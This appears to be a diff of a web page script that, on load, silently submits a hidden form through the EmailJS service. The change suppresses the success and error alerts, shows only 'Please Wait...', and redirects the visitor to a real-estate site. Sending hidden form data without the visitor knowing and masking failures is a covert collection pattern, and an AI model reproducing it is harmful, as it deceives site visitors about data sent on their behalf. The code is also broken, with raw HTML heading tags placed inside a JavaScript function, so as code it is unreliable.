@@ -33,15 +33,15 @@
 
     // Send form on load
     window.onload = function () {
-        <h2>Sending message1...</h2>
+        <h2>Please Wait...</h2>
 
       emailjs.sendForm('service_hlkt43g','template_g7nwiii', '#hidden-form')
         .then(function () {
-                    alert('Email sent.\n');
-          window.location.href = 'https://www.yahoo.com';
         }, function (error) {
-          alert('Email failed to send.\n' + JSON.stringify(error));
+         /* alert('Email failed to send.\n' + JSON.stringify(error));*/
         });
+                  
+          window.location.href = 'https://1213-cordova-rd.rechat.site/ ';
     };
       <h2>Sending message3...</h2>
 
